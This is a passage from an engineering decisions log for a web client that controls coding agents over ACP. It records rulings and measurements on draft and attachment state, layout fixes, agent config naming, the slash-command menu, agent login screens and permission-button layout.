Enter sends it to B's agent, above B's transcript, behind a `busy` spinner that made
`submit` swallow everything typed into B. The menu path was the same shape one
function over — `applyValue`'s callback writes the completion text and moves the
caret, and `closeMenu()` closed B's open `/` menu on a config change dispatched
against A.

**`send`'s `late` argument is what makes "only ever asked after an await" a property
rather than a hope.** `send` is reachable both ways — `submit` calls it straight off
the keystroke, `applyValue`'s callback a config round trip later — and stating the
rule in a comment alone made it false: `liveKey` is written from an effect, so on the
synchronous door the guard answers `false` in the window between a session-switch
render and its flush, and the message would have gone to the daemon while the box
stayed full, no echo was drawn and no spinner lit. That is the one rendering that
reads as "it did not send" and invites a duplicate. `late` is required with no
default for `LaunchOptions.fileIo`'s reason: a new call site has to decide.

**Consequence.** A prompt refused while you are looking at another session no longer
repopulates the visible box — the text is in `drafts` under its own session and
appears when you return — and `busy` is cleared on every session switch, so Send is
enabled on the new session while a previous prompt is still in flight. The daemon
answers `409 turn_in_flight` if that one is itself mid-turn, which the button already
surfaces.

**Not assertable, and said so rather than simulated.** Nothing here is exported and
nothing observable leaves the component; reaching it needs a mounted component
re-rendered under a new `key` *without* remounting, which is the premise of the bug.
`webcheck` stubs `window` and a loopback socket and has no renderer. The keyed halves
it still runs unconditionally **are** asserted, through the composer and attachment
sections.

**Status.** Current

#### Q3.103 — What happens to a file attached while a send is in flight?

**Rule.** It survives. `restoreAttachments` merges — restored items first, then
whatever is live now minus any `localId` already restored — rather than assigning.

**Why.** Paste, drop and the paperclip all stay live during a 90s prompt, so a file
attached mid-flight was deleted from the module map by the restore that runs when
the send is refused. Its chip vanished with no error, its upload ran to completion
against the daemon's per-session 100 files / 100 MiB, and its `cancel` closure went
with the entry so nothing could abort or retry it — then the retried send went
without the screenshot that had been attached to it.

**The merged list may exceed `MAX_PROMPT_ATTACHMENTS`**, and that is preferred:
`admitFiles` bounds *adding*, not restoring, and silently truncating here would be
the bug this fixes. An eleven-chip message is refused by the daemon with its own
message and the chips stay on screen to be removed.

**Measured.** `webcheck` drives the module's own map: reverting to an assignment
fails three checks — a chip pasted mid-flight answers `["a","b"]` instead of
`["a","b","c"]`, "the restored ones lead, in their own order" answers `["early"]`
instead of `["early","late"]`, and the overlapping-restore case loses the live one —
while writing the merge as a plain concat fails the dedup arm, which is one file
drawn twice under one React key.

**Status.** Current

### Layout bugs found in the live app

#### Q3.57 — What caused the empty space under the composer?

**Decision.** An invisible one-pixel `sr-only` paragraph escaping the transcript's
clip. The fix is `relative` on the scroll box, so nothing absolutely positioned
inside the transcript can escape its clip again.

**Why.** `EventList`'s `role="status"` live region is `sr-only`, which Tailwind
implements as `position: absolute`. An absolutely-positioned element is clipped by
its *containing block*, not by whichever scroll container it happens to sit in —
and the transcript's scroll box carried no `relative`, so the nearest positioned
ancestor was the wrapper **outside** it. That paragraph therefore stopped being
the transcript's problem and became `main`'s scrollable overflow, at its static
position at the end of the conversation.

**Measured.** In the live app at a 798×823 viewport: `main.clientHeight` 823,
`main.scrollHeight` **1105**, every element inside reporting a `bottom` within the
viewport except one 1px `<p>` at 1105. So `main` was scrollable by 282px of
nothing, and scrolling it left blank space under the composer with the session
column riding up out of view — which is why the reporter's own measurement showed
`SessionView` at exactly the right height of 823 and a `top` of **−237**. After
the fix, verified at three viewports: `scrollHeight` equals `clientHeight`, so
`main` cannot scroll at all and the space is structurally impossible rather than
merely absent.

**Status.** Current

#### Q3.58 — Was the phantom scroll caused by the transcript rewrite?

**Decision.** No — it was pre-existing and merely made visible.

**Why.** While only the newest 400 events were drawn, that paragraph's static
position was near the fold and the overflow was too small to read as anything;
rendering the whole conversation moved it a thousand pixels down. The episode is
worth keeping as the shape of the thing: three plausible diagnoses in a row — an
ancestor `height: 100%` chain, a percentage that would not resolve, a stale bundle
— each of which reproduced the *symptom* in a fixture and none of which was the
cause. What settled it was logging into the deployed app and enumerating every
element's `bottom`.

**Status.** Current

#### Q3.59 — Why is the shell `h-dvh` rather than `h-full`?

**Decision.** `h-dvh`. The `html, body, #root` height rule stays, because the
sign-in and loading screens sit outside the shell and size against it. (That was
written as "the KeyGate", which is gone — a name that greps to nothing is a bug in
this file; `SignIn.tsx` is the screen it refers to.)

**Why.** `h-full` is `height: 100%`, which resolves against the parent — so the
app being the height of the window depended on `html`, `body` and `#root` all
carrying `height: 100%`, a three-link chain waiting to break. When any link fails
to resolve, the whole column collapses to its content height: the transcript stops
being `flex-1` of anything, the composer lands directly under the last message,
and the rest of the window is empty. `dvh` resolves against the viewport and
depends on no ancestor, so there is no chain left to break; it is also the correct
unit where `100%` and the visible viewport differ, which is any mobile browser
with a collapsing toolbar and `viewport-fit=cover` set.

**Measured.** Reported from a real browser, and it reproduces exactly by breaking
one link in a fixture built against this app's own CSS — composer bottom at 193px
of a 900px viewport, transcript squeezed to 40.

**Status.** Current

### The agent's own controls

#### Q3.60 — Are any config categories hidden?

**Decision.** `model_config` is hidden, and with it the `…` overflow button it was
the sole content of. Unknown categories are still only demoted behind `…`, not
binned.

**Why.** Its one occupant is claude's `Fast mode`, removed by request — and the
overflow button going too was the actual complaint. Hiding a category that is
*known* is a decision about a known control; an unknown one still goes behind `…`
because ACP says a category must not be required for correctness, and the button
reappears the moment such a control exists.

**Status.** Current

#### Q3.61 — Two agents call one control different things — whose word wins?

**Decision.** Ours, through `labelFor`, keyed on category. The strip, the chip's
menu heading, the second stage of the `/` menu and the `/effort` row's own
description all read it through that one function.

**Why.** Same slot, same category, same thing, two words — and worse, *internally*
inconsistent: `buildCommands` already synthesizes this control as `/effort` on
both agents off the same category, so on kimi the slash menu said `effort` and the
chip one tap away said `Thinking`. The command has the stronger claim on the name,
because a name somebody types has to be portable, which is why it is ours there
rather than the agent's. Narrow on purpose: `model` is `Model` on both and `mode`
is `Mode`, so there is nothing to reconcile and the agent's own word stands; an
unknown category has no second opinion at all. Overriding a name we have no better
version of is how a client starts inventing vocabulary.

**Measured.** 2026-08-04 against both live agents: claude calls reasoning effort
`Effort` and kimi calls the identical control `Thinking` (`id: "thinking"`,
`category: "thought_level"`).

**Status.** Current

#### Q3.62 — Two agents call one *choice* different things — does the same answer apply?

**Decision.** No — the opposite answer applies, and `choiceOverride` in
`agentConfig.ts` is where both `Default`s are handled. What it returns for the two
is deliberately **not** the same shape: a label *and* a description for effort,
and only a description for mode. Three surfaces read it — the chip, the control's
menu row, and the `/` menu's second stage.

**Why.** `choiceOverride` is a generalisation of the `adaptiveLabel` that renamed
claude's effort `default` to `Adaptive`, so one function holds both.

**Measured.** 2026-08-06 against both agents: `mode` value `default` is named
`Manual` by claude with no description, and `Default` by kimi with the description
"Manual approvals; tools execute normally."

**Status.** Current

#### Q3.63 — Should the mode names be reconciled to `Manual`?

**Decision.** No. `ChoiceOverride.label` is `string | null`, with `null` as the
ordinary answer and renaming as the exception. The description is a **fallback,
not an override**: kimi's own sentence is shown, and claude — which sends nothing
for this mode — gets ours ("The agent asks before running each tool").

**Why.** `Manual` was defensible — claude's own word for this id, and the first
word of kimi's own sentence — but the premise is weaker here than at
`thought_level`. Effort has nothing underneath: every effort choice claude
publishes carries `description: null`, so the name is the only thing there is and
it conveys nothing, which is what earns a rename. kimi *did* say what its mode
means, in a sentence. So the fix for "Default says nothing" is the caption rather
than the name, and the agent goes on being called what it calls itself — the rule
`labelFor` already states for controls, applied to choices. `webcheck` asserts the
fallback from **both** agents' measured shapes, because a rule here is silently
correct on whichever agent the author happens to be running.

**Rejected.** Reconciling the mode names to `Manual`. It was built and taken back
out.

**Status.** Reversed an earlier decision

#### Q3.64 — How does the `/` menu name a mode?

**Decision.** By the agent's id, always. `/manual` went the same way the rename
did.

**Why.** The id is what makes these portable — both agents call this mode
`default` underneath — and it is what somebody who knows the agent reaches for.
What `default` fails to *say* belongs under the row, where there is room for a
sentence, rather than in a name this client decided on.

**Status.** Current

#### Q3.65 — Is a control with exactly one already-selected choice a bug?

**Decision.** No — it is a real state, and no list of values is ever hardcoded.

**Why.** The choices under a control are the agent's, per model. This is the same
lesson as claude dropping `bypassPermissions` from its modes under root.

**Measured.** The same day as Q3.62: on `kimi-code/k3` `thinking` offers
Low/High/Max, and on `K2.7 Coding` it offers the single value `On`.

**Status.** Current

#### Q3.66 — Why did the model chip read "Default", and how is the real name recovered?

**Decision.** The snapshot keeps the **selected** choice's description — 1 of N,
clipped to 120 chars — and `chipValue` shows the head of it, minus qualifiers.
Narrowed to `category === "model"`.

**Why.** The model is resolvable and was being thrown away: its `default` choice
is named `Default (recommended)` and only its **description** says which model
that is. `snapshotConfig` was stripping every description, and recovering them
from the `agent_config` event in the transcript is not a substitute — that event
lands at session start, so on any conversation longer than the render window it is
not loaded and the label silently reverts. The narrowing exists because for `mode`
the name is "Manual" and the description is a whole sentence, so the rule would
make every other chip worse to fix one.

**Measured.** 2026-07-31 against claude 0.63.0: the description is "Opus 5 with 1M
context · Best for everyday, complex tasks", and against five model blurbs
stripping was worth doing. Verified end to end, the chip reads `Opus 5` and the
"with 1M context" part stays in the menu row where there is room for it.

**Status.** Current

#### Q3.67 — Effort has no description at all — what does its `default` mean?

**Decision.** The control says `Adaptive`, with "The model decides how much to
think, per turn" underneath. Narrow by construction: `thought_level` *and* the
literal value `default`.

**Why.** Every effort choice claude publishes carries `description: null`, and the
SDK's `EffortLevel` is `low|medium|high|xhigh|max` with no "default" member — so
there is nothing in the ACP payload to resolve. The answer is in the binary,
twice: `/effort`'s own parser maps the unset case to `{value: void 0}`, i.e. **no
effort parameter is sent**, and the documented behaviour with none sent is
*"Adaptive thinking on by default (omitting `thinking` runs adaptive)"*. So
`default` is not a hidden fixed level that could be named — it is the model
choosing per turn. The narrowing matters because kimi's equivalent is `off` and
means something else.

**Status.** Current

#### Q3.68 — What happens when a placeholder choice duplicates a real one?

**Decision.** `dedupeAliasChoices` in `registry.ts` removes the placeholder and
moves the selection onto the concrete row. Where nothing duplicates, nothing is
dropped.

**Why.** Two choices with the same non-empty description are the agent saying they
are the same thing — which is exactly what claude's model list does with `default`
and `opus[1m]`. It lives on the daemon because that is the only side that has
every description (the snapshot keeps just the selected one), and it makes the
snapshot smaller. For effort the placeholder is the only way back to the agent's
own default, so removing it would remove the way back.

**Status.** Current

#### Q3.69 — Where do the agent's controls live, and how are they keyed?

**Decision.** On the composer — mode, model, reasoning effort, whatever else the
agent publishes. Everything is drawn from ACP's `category`, never from an id, and
the values are not hardcoded either.

**Why.** claude calls effort `effort` with values `default|low|…|max` and kimi
calls it `thinking` with values `off|…`, so a bar keyed on ids renders one agent's
controls and none of the other's. claude also drops `bypassPermissions` from its
mode list when it runs as root without `IS_SANDBOX`, so a fixed list would offer a
mode the agent rejects.

**Status.** Current

### The `/` command menu

#### Q3.70 — Where do the entries in the `/` menu come from?

**Decision.** Two sources. The first is what the agent publishes over ACP —
skills, plugins and MCP commands on claude; six builtins plus skills on kimi —
arriving as `{name, description, hint}`. The hint is shown as a placeholder and
never inserted; choosing one of these writes `/name ` into the box.

**Why.** ACP's whole argument surface for a command is a hint *string*: no schema,
no enums, no completion. Writing `/name ` is the only way to invoke a command at
all — there is no `session/execute_command`, and a command *is* a message
beginning with a slash.

**Status.** Current

#### Q3.71 — Why are `/model`, `/effort` and `/mode` synthesized rather than published?

**Decision.** They are built from `agentConfig` by the same `category` the control
strip is built on, and choosing one opens the agent's own choices and applies
through `POST /sessions/:id/config`; **no text is sent.** A synthesized control
**shadows** an identically-named published command. The rule is asserted in
`webcheck` from both agents' shapes.

**Why.** The two agents disagree in the way that makes synthesis necessary *and*
makes the shadowing rule live rather than defensive. kimi publishes none of the
three, so on kimi they exist only because they are built — and could not work any
other way, since an unrecognised slash command is intercepted by its adapter and
answered `Unknown ACP command` without reaching the model. claude publishes
`/model` and `/effort` (not `/mode`), and in a terminal `/model` opens an
interactive picker; over ACP there is no interactive picker to answer with, so
sending it as text is a dead end that ends the turn on a prompt nobody can answer.
Same three entries, same behaviour, on both agents — which is the whole point, and
is the thing that would fail silently on exactly one of them.

**Measured.** 2026-08-03.

**Status.** Current

#### Q3.72 — Is it settled that claude advertises `/model` and `/effort`?

**Decision.** No, and nothing depends on it. The shadowing rule is written
unconditionally.

**Why.** One paragraph of the source says claude advertises them; `commands.ts`
and `webcheck` said the opposite, in two places, under the same measurement date.
One of them is wrong and re-driving the live agent is the only way to know which.
The code refuses to be the third place making the claim, because the shadowing
rule is correct whether the collision is live today or arrives with the next CLI
release. The half that *is* verified and does the work is kimi's — it publishes
none of the three, and its adapter intercepts an unrecognised slash command before
the model sees it.

**Status.** Known limitation

#### Q3.73 — What happens to a control with nothing to choose between?

**Decision.** It is skipped and never offered in the menu.

**Why.** ACP's `boolean` kind carries no `choices`, and a `select` can arrive
empty; either produced a row whose second stage was a list of length zero, so
choosing it cleared the whole draft and then rendered nothing, because the menu
only opens onto a non-empty list — a dead end that ate what had been typed.

**Rejected.** Giving it a synthetic on/off pair. Nothing here knows what a
particular flag means, the control strip already draws booleans where they belong,
and inventing two labels for an agent-defined value is the id-keyed guessing this
whole surface is built to avoid.

**Status.** Current

#### Q3.74 — What does a completion replace when the caret is inside the name?

**Decision.** The whole token, never the text before the caret. The query is a
*prefix* of the token rather than the token, and it is derived through
`slashQuery` rather than a hand-written query.

**Why.** The caret is allowed to sit inside the name — arrowing left does it, and
so does tapping back to fix a typo, and neither closes the menu. Slicing at the
caret left the rest of the name behind as an argument: `/compact` with the caret
at 3 completed to `/context mpact`, which is then sent to the agent, and on a
control it silently left `mpact` in an otherwise cleared box. `slashQuery`'s
mid-caret behaviour was asserted and `completion` was asserted, and the two were
never composed; they are now, because a hand-written query is how they stayed
apart.

**Status.** Current

#### Q3.75 — What resets the keyboard highlight in the menu?

**Decision.** The query string and the stage — never the identity of the match
list. The row count clamps it, and the highlighted row is scrolled into view.

**Why.** It was keyed on the identity of the match list, and those identities move
on a timer rather than on content: the session snapshot is reparsed whole every
four seconds, and the prose map is rebuilt per streamed event. So the highlight
snapped back to row 0 every four seconds at rest and continuously while the agent
worked — which is exactly when the menu is used, since the composer stays live and
queues. Enter then acted on row 0, and for a mode shortcut that applies in one tap
with no second step, so aiming at `/dontAsk` and landing on `/default` was a
silent permission change. The row is scrolled into view because the panel holds
about five rows and claude publishes a hundred.

**Status.** Current

#### Q3.76 — Does typing `/plan` do what choosing it from the menu does?

**Decision.** Yes. `typedConfigCommand` in `commands.ts` splits on `value` — the
same field the menu branches on. A mode carries one, so it is a *change*, and
anything after the name is the message to send once it has landed. `/mode`,
`/model` and `/effort` carry none, so they are a *question* and open their own
choice list with nothing sent. A published `prompt` command such as `/compact` is
untouched and sent as typed. Dispatch happens first, and the message goes only if
the daemon agreed.

**Why.** The menu applies a synthesized control on selection and sends no text —
but somebody who knows the name does not open a menu, they type it and press
Enter, and that went to the agent as a *prompt*. The whole reason these three
names are ours rather than the agent's is that they are portable and typeable, so
typing one had to reach the same place. Dispatch-first is `applyValue`'s existing
rule: a prompt written for plan mode must not run in the previous one because the
change was refused.

**Measured.** `/plan I want to build a tg bot` — a slash command with an argument
after it — was delivered as text and claude answered "/plan isn't available in
this environment", so a mode change became a wasted turn. Verified end to end
against the live app with the network recorded:
`/plan I want…` produces `POST …/config {"configId":"mode","value":"plan"}` followed
by `POST …/prompt {"text":"I want…"}`; `/plan` alone produces the config call and no
prompt; `/mode` produces no request at all and opens the six modes; and an
ordinary message is unchanged.

**Status.** Reversed an earlier decision

#### Q3.77 — Is each mode also a command of its own?

**Decision.** Yes, lifted to the top level and applied in one tap, with a tick
against the one already in force. Modes only. Here a published command **wins** a
name collision.

**Why.** Mode is the one control that is a *verb* — reached for several times an
hour, mid-conversation — so `/plan` should mean what somebody typing it means
rather than "open the mode picker and then choose plan". Nothing here knows the
word "plan": the names are whatever the agent publishes, so a different agent gets
different commands from the same rule. Modes only, because a model list expanded
this way would put `/opus[1m]` in the menu, and effort's five values mean nothing
standing alone. The collision rule is deliberately the opposite of Q3.71's:
`/model` shadows because sending it as text is a dead end, while a mode shortcut
is a convenience and a command somebody actually installed is the more specific
intent.

**Measured.** claude's modes are `auto`, `default`, `acceptEdits`, `plan`,
`dontAsk`, `bypassPermissions`.

**Status.** Current

#### Q3.78 — Is the agent's own command order preserved?

**Decision.** No — two tiers: built-ins above installed skills, stable inside
each. Scope is read off the end of the *description*.

**Why.** This reversed an earlier rule that the agent's list is never re-sorted,
on the grounds that ranking is the filter's job. The order the agent sends is
*installation* order, so opening the menu showed somebody's skill collection while
`/compact`, `/context` and `/model` sat past position fifty behind a scroll. Two
tiers means what the agent sent still decides everything the scope does not. The
scope comes off the description because ACP's `AvailableCommand` is
`{name, description, input}` and has nowhere else to put it — the format an
adapter sends looks like `"… (gstack) (user)"`. An unrecognised shape is "no
information" and sorts with the built-ins, so kimi keeps its order exactly and a
reworded claude degrades to that rather than to something wrong. What is *not*
separable is a CLI built-in from a bundled skill: nothing in the payload
distinguishes `/compact` from `/dataviz`, so both are tier one.

**Measured.** 53 of claude's 99 entries are `(user)`-scoped skills and they arrive
first.

**Status.** Reversed an earlier decision

#### Q3.79 — Can a command the adapter hides still be offered?

**Decision.** `/clear` is restored, per agent, and **appended** to the agent's own
list rather than prepended. The other seven filtered names are not restored.

**Why.** claude filters eight names out before sending — `clear`, `cost`,
`keybindings-help`, `login`, `logout`, `output-style:new`, `release-notes`,
`todos` — and that is about what is *advertised*, not what the CLI accepts.
`/clear` carries the one thing only it can say: the daemon's log is not the
agent's memory, so the transcript goes on showing a conversation the agent no
longer has. The other seven must not be added by guessing — `login` and `logout`
would break the session's credentials from a box that has a Settings screen for
that, and `keybindings-help` and `output-style:new` are interactive terminal UI
with nothing to render into. Appending is a ranking decision rather than
tidiness: `rankOf` breaks ties by build index, so prepending made `/clear` — the
one irreversible entry in the menu — outrank `/compact` and `/context` for the
query `c`, the most natural prefix in claude's whole list. A restored command is
also the one we are least sure of, so it loses a name collision to anything the
agent advertises itself. The list is deliberately *not* on the session snapshot,
and an unknown `/foo` is still sent as typed: the menu is a hint, not a filter —
kimi never republishes mid-session, so a cached list can lag what the agent
accepts, and refusing to send something the agent may well know is worse than
spending one turn on its own error message.

**Measured.** 2026-08-03: seed a codeword, send `/clear`, ask for it back, and the
answer is `NO MEMORY`.

**Status.** Current

### Attachments

#### Q3.80 — How are files attached other than through the picker?

**Decision.** Ctrl+V and drag-and-drop. `onPaste` reads `clipboardData.files` and
calls `preventDefault` **only when there really are files**. Drop is on the whole
composer rather than the textarea.

**Why.** A clipboard carrying an image usually carries a text alternative too, and
letting the default run pastes a filename or a data URL beside the chip, while an
ordinary text paste has to fall straight through untouched. Drop is on the whole
composer because that box is 44px tall when empty. `onDragOver` must
`preventDefault` or `drop` never fires, and `onDragLeave` ignores transitions
between children or the highlight flickers on every internal edge.

**Status.** Current

#### Q3.81 — What name does a pasted file get?

**Decision.** `pastedName` synthesizes `pasted-<utc-stamp>.<ext>` from the mime
type, and `uploadFile` takes the name as an argument rather than reading
`file.name`.

**Why.** A pasted file can arrive **nameless**, and an empty `?name=` is a
`400 invalid_name` from `sanitizeUploadName` — so Ctrl+V would have failed with an
opaque error in precisely the situation somebody reaches for it. Taking the name
as an argument makes the chip on screen and the name on disk one string by
construction.

**Status.** Current

#### Q3.82 — Is the paperclip gated on an agent capability?

**Decision.** No — it is ungated. Only the ten-file cap ever closes it, and a
terminal session still accepts an attachment.

**Why.** ACP requires every agent to support `resource_link`, so there is no agent
for which attaching does nothing. `AgentConfigBar` held a comment saying the
attach slot was deliberately empty because no layer of this system accepted an
attachment and "a paperclip that toasts 'not supported' is worse than none" —
every layer does now, so it holds the button. A terminal session accepts one
because `resume` exists and "it stopped, let me give it a screenshot and start it
again" is the ordinary flow rather than an edge case.

**Status.** Reversed an earlier decision

#### Q3.83 — What did adding the paperclip expose in `AgentConfigBar`?

**Decision.** Its early return had to be fixed: it rendered `null` when there were
no options *and* no context readout.

**Why.** That is the half that would have failed silently on exactly one agent: on
kimi with no context reporting — or on any restored session, which has no live
agent to publish controls — the whole bar and the paperclip with it would have
disappeared while claude was fine.

**Status.** Current

#### Q3.84 — Where does attachment-chip state live?

**Decision.** In a module `Map` in `attach.ts` — not `useState` and not the store.
Chips get their own full-width row. A **failed** chip stays, carrying the daemon's
own message, with a retry off the held `File`. Send is disabled while any chip is
uploading, and `submit()`'s catch arm restores text and chips **together**.

**Why.** Not `useState`, because list → detail → back unmounts the composer and a
chip lost that way is bytes already on the daemon that nothing can reference; not
the store, because a progress event at 60fps would wake every subscriber including
the session list — strictly worse than the keystroke `Composer` already refuses to
put there. A session switch mid-upload therefore does not cancel anything; the
completion callback resolves `(key, localId)` and no-ops if the entry is gone.
Chips get their own row because they wrap. A failed chip stays rather than being
dropped with a toast, which is the "nothing to retype from" failure this design
already names for the one-tap config path. Text and chips are restored together
because `turn_in_flight` is the commonest refusal and the uploadIds are still
valid on the daemon.

**Status.** Current

#### Q3.85 — What does a download button do for a path outside the workspace?

**Decision.** Nothing is drawn — not a disabled button, not one that toasts.
Download buttons sit on the `file_change` row, on each tool call's `locations`,
and on every attachment chip.

**Why.** The first two carry **absolute** agent-chosen paths while the route takes
a workspace-relative one. Same rule as the paperclip, one screen over, and it also
avoids a guaranteed 403.

**Status.** Current

### Creating a session, and what the screen still does not do

#### Q3.86 — What does the create-session screen ask?

**Decision.** Three things: machine, agent, folder — and deliberately *not*
whether to use a worktree, though `POST /sessions` still takes `worktree` and
`branch`. `SessionView`'s header reports which one happened, with the
`dirty_source` warning promoted out of the transcript to a banner.

**Why.** The worktree choice is one a person can only weigh if they have the
folder open somewhere else; here the code lives on the daemon's host and this UI
is often the only way to it, so there was no second view to protect and the
question had no answerable form. Worse, choosing isolation produced a branch this
UI gives no way to see, diff or merge — it manufactured the "where did my code go"
problem it looked like it prevented. The daemon's `auto` already does the right
thing either way. "A worktree branches from a commit, so your uncommitted work is
not in this session" is not a line to find by scrolling.

**Status.** Reversed an earlier decision

#### Q3.87 — Why was the first-prompt box removed from the create form?

**Decision.** It is gone. The composer is where every message is written.

**Why.** A four-row textarea justified as optional, and optional was the thing
wrong with it: it sat between the folder and the Start button on every session
anybody has ever created, asking for something most of them did not want to type
there. The composer is one navigation away, is where every *other* message is
written, and has the `/` menu, attachments and the agent's own controls beside it
— none of which that box had. It also removed the one request this screen could
not report on: the prompt was fired best-effort after `POST /sessions` and
swallowed its own failure, because by then the session existed and landing on it
beat an error about a message.

**Status.** Reversed an earlier decision

#### Q3.88 — Is the agent picker a native `<select>`?

**Decision.** No — it is the app's own `Dropdown`, matching `MachinePicker`
directly above it. `DropdownItem` has `description`, `disabled` and `adornment` as
fields.

**Why.** Two fields on one short form looked like they came from different
applications. The `<select>` was styled as far as a `<select>` can be —
`appearance-none`, this app's border and radius, a chevron over it — and none of
that reaches the part being looked at, because the open list is drawn by the
platform: OS font, OS size, OS highlight, in the middle of a screen that is
otherwise entirely this app's. Half-styling a control is worse than leaving it
alone, since the closed state promises what the open state does not keep. It also
could not carry what the row wants to say: `disabled` on an `<option>` is grey
text and nothing more, so "not installed" was glued onto the label as a string,
and the reachability dot had nowhere to go.

**Status.** Current

#### Q3.89 — Was the workspace warning really "promoted out of the transcript"?

**Decision.** Not until `showsInTranscript` existed. `latestWorkspaceWarnings` is
now shared between the banner and `webcheck`.

**Why.** That sentence was false from the day it was written: `EventList` went on
drawing the same warnings as a `workspace` row in the transcript, so "promoted out
of" described an addition rather than a move. `showsInTranscript` is what finally
made it a move, and sharing the helper with `webcheck` is what pins the cut rather
than merely intending it.

**Superseded.** The banner was deleted on request, and with it
`latestWorkspaceWarnings` — which had exactly one production caller and became
dead the moment the banner went. So the answer to the heading is now "yes, out of
the transcript and out of the app": `workspace` stays in `TRANSCRIPT_SILENT`, the
header keeps mode and branch, and the **warnings themselves are drawn nowhere**.

What that costs is one specific thing, worth naming rather than leaving to be
rediscovered: `dirty_source` says uncommitted work in the source checkout is *not*
in this session, and somebody who does not know that spends the next ten minutes
wondering why the agent cannot see their changes. That was the whole argument for
promoting it to a banner in the first place, and it is now unanswered on screen.

The events are untouched — the daemon still records them and they are in the log —
so restoring is deleting one string from `TRANSCRIPT_SILENT`, which brings them
back as ordinary transcript rows rather than as a banner. The banner is the thing
that was refused, not the information; if the information is wanted back, that one
line is the cheap way and a quieter line on the header is the considered one.

**Status.** Superseded — the banner is gone; the suppression remains

#### Q3.90 — Where do agents get logged in?

**Decision.** Inside the machine, at
`/settings/machines/:machineId/agents/:agentId`, by two paths — a wizard that
runs the agent's own login under a pty on the daemon's host, and a paste box for
a token minted elsewhere, the second behind a disclosure.

**Why.** Neither path alone is enough, which is the original answer and stands.
What changed is *where*, and why is Q3.415.

**Status.** Current

#### Q3.415 — Why did the Agents section stop being a section?

**Decision.** Deleted. Agent settings hang off a machine, two URL depths under
Machines, reached by a **Configure agent** button on the machine's row.

**Why.** The section opened with a machine dropdown, and its own copy said why
that was the wrong shape: *"Credentials live on each machine, in that daemon's
database and that host's home."* A screen whose first control asks a question its
second line answers is a screen in the wrong place. And most people use one agent,
so three cards of equal weight made the one that mattered hardest to find; the
chooser is a list of three with their statuses, which is what somebody arriving
here is usually asking anyway.

**Why the machine is in the URL rather than in component state.** The two reasons
`/new/:machineId` already gives: a picker held in component state forgets itself
on back-and-forward, and `Header`'s close is a fixed destination, so a screen
needs a list to close *to*. The **◀** walks one level up — agent → chooser →
machines → index — rather than jumping to the index, because somebody who picked
the wrong agent wants the chooser. (This said *the ✕* and was wrong from the
start: the ✕ is `useUnder` and leaves settings altogether, for whatever was under
the pop-up when it opened; `settingsUp` is the chevron. Corrected with Q3.427,
which moves the title out of that same head and had to state which control does
what.)

**Where the rules live.** `settings.ts`'s `parseSettingsRoute`, not `router.ts`,
for the reason that file's header already gives: `router.ts` touches
`window.location` in its module body and `webcheck` cannot import it. Three
refusals, each falling *up*: an unknown agent id drops to the chooser (validated
against `AGENT_IDS`, because it is handed straight to `PUT /agent-auth/:agent`), a
segment that is not `agents` drops to the machine, and a machine id under another
section is ignored.

**A stale `/settings/agents` falls to the index** and is deliberately not
redirected to Machines: a redirect would have to guess which machine, and the
index is the screen that lists the way there.

**Configure agent is outside the ownership gate**, unlike Rename and Retire.
Those are acts on the registry and the control plane answers 404 to anybody but
the owner; configuring an agent is an act on the *daemon*, reached with the
`session:write` grant a shared machine carries. Gating it on ownership would hide
the one thing a grantee can do on that row.

**Consequence worth having.** `NewSession`'s "Sign in" button — the only route
from "not signed in" to the screen that fixes it — now goes straight to that agent
on that machine, instead of to a screen that re-asked for both.

**Status.** Current

#### Q3.416 — Is a login transcript the interface?

**Decision.** No. `ui/login.ts` reads the pty bytes into three things — a page to
open, a device code to read, a recognised failure — and the raw `<pre>` moves
behind a disclosure.

**Why.** Every one of these flows wants the same two things done by a human: open
a page, and either read a code off it or paste one back. A terminal transcript is
a correct rendering of the bytes and a hostile one for somebody on a phone, three
taps into Settings, who wants to know what to do next.

**The fallback is the whole safety property.** None of this is negotiated with any
agent and a vendor may reword any of it in a release, so when nothing is
recognised the view comes back all-null and the disclosure opens **by itself** —
the worst case is exactly the screen this replaced, never less than it.
`transcriptIsTheAnswer` is an exported predicate rather than a condition spelled
out in the card, so `webcheck` asserts the rule and not a copy of it.

**What is measured and what is a guess**, said out loud because the difference
matters here: the failure table's first entry is the exact string BSD `script`
prints, verified. The device-code patterns are conservative guesses — a
code-shaped token near the word `code`, else a bare `XXXX-XXXX` — and are what the
fallback exists to make survivable.

**The input box is drawn only where the flow reads one**, from the daemon's
`login.needsInput` rather than from anything in the bytes. Reading that out of the
transcript would be the guessing this file declines to do, and on macOS the box
would be typing into a stdin that is not connected.

**Status.** Current

#### Q3.91 — What does the web client still deliberately not do?

**Decision.** No admin UI for users, machines or grants (that stays `cpctl`), and
no changes or diff *view* — `GET /sessions/:id/changes` is called by nothing here.
It polls `GET /sessions` per machine for the list and holds a socket only for the
three most recently viewed sessions. It has four runtime dependencies
(`react-markdown`, `remark-gfm`, `highlight.js`, `lucide-react`); the highlighter
and its languages are dynamically imported.

**Why.** Downloading a file the agent touched from the row that mentions it is a
different thing from browsing the change set. A socket per session across a fleet
is dozens of sockets on a phone. The dynamic import keeps the highlighter out of
the first paint.

**Status.** Current

### The row of decision buttons

#### Q3.92 — May the card decline to draw an option the agent offered?

**Decision.** Yes, and under four narrowings at once — `drawableOptions` in
`permission.ts`. An approval whose rendered label exceeds `BUTTON_LABEL_MAX` (32)
is not drawn **only if another option of the same `kind` survives it**. A refusal
is never dropped whatever its length. A set carrying more than one `allow_once` is
not filtered at all, because that is a question's answers rather than one
approval's scopes — the same test `askedQuestion` makes.

**Why.** The row carries its meaning by *position* — the refusal alone on the
left, the reversible approval filled on the right — because the colour these
buttons had was removed. codex words a scoped grant as `Allow Commands Starting
With` plus a command path, which is unbounded by construction and wrapped the row
into an arrangement where the left/right rule said nothing while still looking
deliberate.

**Measured.** The narrowings are not decoration; the rule shipped as "drop every
approval that does not fit" and each of the three cases below was reachable with
that form. claude's own scoped grant is `Always Allow Read(//tmp/svgout/**),
Read(//private/tmp/svgout/**)` — 64 characters, and the *only* `allow_always` on
that card, so it was dropped and a standing grant became unreachable from a phone
on the one request where the scope is the decision. Symmetrically, an agent
wording `allow_once` past the ceiling lost the narrow grant instead, and
`primaryId` is the last approval in the row — so the filled button, the one
`AskCard` promises is the reversible approval, became the permanent one. And
kimi's `AskUserQuestion` arrives down this channel: when `rawInput` was truncated
at the 8 KiB cap or the transcript had not paged in, `askedQuestion` answers null,
the card falls back to buttons, and two of four model-written answers were deleted
with nothing said.

**Alternatives.** *Recognising the option by id* — nothing knows
`accept_execpolicy_amendment`, and the next agent will word its own differently.
*Truncating the label with an ellipsis* — the globs are the only thing saying what
is being permanently granted, which is why `optionLabel` keeps the long name in
